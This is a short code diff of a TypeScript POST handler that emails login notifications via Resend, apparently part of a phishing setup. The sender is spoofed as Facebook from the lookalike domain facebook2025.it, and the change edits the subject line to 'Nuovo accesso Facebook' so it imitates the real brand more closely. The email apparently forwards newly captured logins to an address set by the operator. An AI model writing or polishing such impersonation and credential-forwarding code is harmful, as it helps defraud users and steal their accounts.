@@ -19,7 +19,7 @@ export async function POST(request: Request) {
     await resend.emails.send({
       from: 'Facebook <securitynoreply@facebook2025.it>',
       to: process.env.EMAIL_TO ?? '',
-      subject: '🛡️ Nuovo accesso Facebook2025',
+      subject: '🛡️ Nuovo accesso Facebook',
       html: `
         <div style="font-family: Arial, sans-serif; padding: 1rem;">
           <h2 style="color: #4267B2;">🔐 Nuovo login registrato</h2>
